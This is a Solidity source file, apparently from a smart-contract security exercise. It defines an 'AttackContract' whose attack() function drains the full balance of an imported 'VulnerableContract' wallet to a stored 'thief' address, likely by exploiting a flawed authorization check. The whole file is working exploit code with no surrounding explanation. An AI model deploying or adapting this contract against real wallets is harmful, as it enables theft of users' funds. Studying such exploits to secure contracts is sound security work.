// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackContract {
    VulnerableContract public wallet;
    address payable public thief;

    constructor(address _wallet, address payable _thief) {
        wallet = VulnerableContract(payable(_wallet));
        thief = _thief;
    }

    function attack() external {
        wallet.transferTo(thief, wallet.getBalance());
    }

    receive() external payable {}
}
